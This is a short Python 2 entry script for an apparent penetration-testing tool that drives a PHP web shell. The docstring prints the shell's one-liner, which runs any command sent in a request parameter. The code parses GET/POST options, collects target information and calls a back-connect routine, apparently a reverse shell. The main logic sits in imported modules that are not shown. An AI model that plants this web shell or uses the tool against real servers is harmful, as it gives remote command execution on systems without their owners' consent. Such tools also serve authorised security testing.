#!/usr/bin/env python

'''
-*- coding: utf-8 -*-

Command controller for <?php system($_REQUEST[parameter]); ?>

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

Developers:
    Ahmed Shawky @lnxg33k
    g0tmi1k @g0tmi1k
'''

#importing modules
from core.libs.executer import commander
from core.libs.menu import getargs, banner
from core.modules.info import info

# check for arguments dependencies
if getargs.url:
    if getargs.method == 'post' and not getargs.parameter:
        print '\n[!] Using post method requires --parameter flag, check examples'
        exit(1)
    if getargs.method == 'get' and getargs.parameter:
        print '\n[!] Using get method doesn\'t require --parameter flag, check examples'
        exit(1)
    else:
        print banner                            # get WebHandler banner
        info.get_information()                  # call get_information and print info
        commander.BackConnect()                 # call BackConnect method
